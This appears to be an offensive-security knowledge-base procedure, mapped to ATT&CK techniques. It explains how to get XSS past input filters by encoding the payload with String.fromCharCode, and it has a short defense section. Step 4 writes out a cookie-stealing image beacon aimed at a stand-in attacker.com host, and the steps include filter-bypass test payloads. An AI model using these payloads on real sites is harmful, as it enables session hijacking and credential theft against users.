---
id: 41ef1c08-80b9-4bde-bc1d-15914626a775
name: ASCII-Conversion-XSS-Filter-Bypass
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:42.422890+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - '[[techniques/Drive-by Compromise|T1189 - Drive-by Compromise]]'
  - >-
    [[techniques/Exploitation for Credential Access|T1212 - Exploitation for
    Credential Access]]
  - >-
    [[techniques/Command and Scripting Interpreter|T1059 - Command and Scripting
    Interpreter]]
sub_techniques:
  - >-
    [[techniques/Command and Scripting Interpreter/JavaScript|T1059.007 -
    JavaScript]]
tags:
  - xss
  - filter-bypass
  - ascii-conversion
  - cross-site-scripting
commands: []
platforms:
  - Web
tools: []
validated: true
---

# ASCII-Conversion-XSS-Filter-Bypass

## Summary

This procedure demonstrates how to bypass web application input filters that block direct XSS payloads by converting the malicious string to its ASCII Unicode values and using JavaScript's String.fromCharCode() method to reconstruct and execute it. It is useful for injecting scripts into reflected or stored XSS vulnerabilities where common characters like '<', '>' or 'script' are sanitized, enabling attackers to steal session cookies, credentials, or perform unauthorized actions on behalf of users.

## Description

In scenarios where web applications employ basic string-based filters to prevent XSS attacks, attackers can evade detection by representing the payload in numeric ASCII form. For example, the string 'XSS' can be encoded as the Unicode values 88, 83, 83. When injected into a JavaScript context (e.g., via an event handler or script tag), String.fromCharCode() dynamically converts these values back to characters, forming the executable payload. This technique targets client-side execution in browsers and is effective against filters that do not normalize or decode numeric representations. It applies to web applications with user input fields like search boxes, comment sections, or URL parameters. Successful execution allows for data exfiltration via beacons or redirects, keystroke logging, or DOM manipulation. Prerequisites include identifying a reflection point and ensuring the input reaches a JavaScript-evaluable context without further sanitization.

## Requirements

1. Access to a web application with an XSS-vulnerable input field that reflects user input into HTML/JS without proper escaping.
2. Basic knowledge of JavaScript and ASCII/Unicode encoding.
3. A testing environment or proxy tool like Burp Suite to intercept and modify requests.
4. Victim interaction, such as clicking a crafted link for reflected XSS.

## Defense

- Implement comprehensive input validation and output encoding using libraries like DOMPurify or OWASP ESAPI to handle numeric and encoded representations.
- Deploy a Web Application Firewall (WAF) configured to detect and block JavaScript functions like fromCharCode() in payloads.
- Enable Content Security Policy (CSP) to restrict inline script execution and eval() usage.
- Regularly audit and patch web applications, including client-side code, to eliminate reflection points.

## Objectives

1. Evade input filters by encoding the XSS payload in ASCII numeric form.
2. Reconstruct and execute malicious JavaScript in the victim's browser.
3. Collect sensitive data such as cookies or perform actions like credential theft.

## Instructions

### Step 1: Identify the Vulnerable Input Point

**Context**: Locate a user input field in the web application that reflects input directly into HTML or JavaScript without adequate sanitization. This could be a search parameter, form field, or URL query that echoes back unsafely.

Test for basic XSS by submitting a simple payload like `<script>alert(1)</script>`. If blocked, proceed to ASCII encoding.

### Step 2: Encode the Payload Using ASCII Conversion

**Context**: Convert the desired malicious string (e.g., 'XSS' for testing or a full script like 'alert(document.cookie)') to its ASCII Unicode values. Use an online tool or manual calculation: 'X' is 88, 'S' is 83.

Reference the code snippet [[codes/JavaScript-String-fromCharCode-XSS-Bypass]] for the reconstruction logic.

For a full alert payload, encode 'alert(1)' as fromCharCode(97,108,101,114,116,40,49,41).

### Step 3: Inject the Encoded Payload

**Context**: Submit the encoded payload into the vulnerable input field, ensuring it lands in a JavaScript context, such as inside a <script> tag, onclick attribute, or eval(). Wrap it appropriately, e.g., `<script>String.fromCharCode(88,83,83).toLowerCase() + ' alert(1)'</script>` to form 'xss alert(1)' if needed.

Use a proxy to modify the request if direct input is filtered on submission.

### Step 4: Verify Execution and Exfiltrate Data

**Context**: Trigger the reflection (e.g., submit the form or load the page) and observe if the JavaScript executes in the browser console or via an alert. For real attacks, modify the payload to send data to an attacker-controlled server, e.g., using an image beacon: `new Image().src='http://attacker.com/?cookie='+document.cookie` encoded similarly.

Check network traffic for exfiltration requests to confirm success.
